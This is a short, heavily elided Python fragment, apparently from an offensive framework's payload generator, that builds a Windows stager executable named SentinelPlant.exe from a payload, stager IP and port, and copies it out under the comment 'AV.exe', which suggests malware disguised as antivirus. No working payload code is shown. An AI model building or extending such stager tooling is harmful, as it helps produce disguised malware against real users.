...
from core.payload_generator.windows.https.sentinelplant import source_files, header_files
...
#------------------------------------------------------------------------------
# Makefile for building SentinelPlant.exe WITHOUT CRT on Linux + MinGW‑w64
#------------------------------------------------------------------------------
...
def build(output_path: Path, payload: str, stager_ip: str, stager_port: int):
	...
	try:
		...
		if dump:
			...
			# 3) Copy AV.exe out
			shutil.copy(tempdir / "SentinelPlant.exe", output_path)
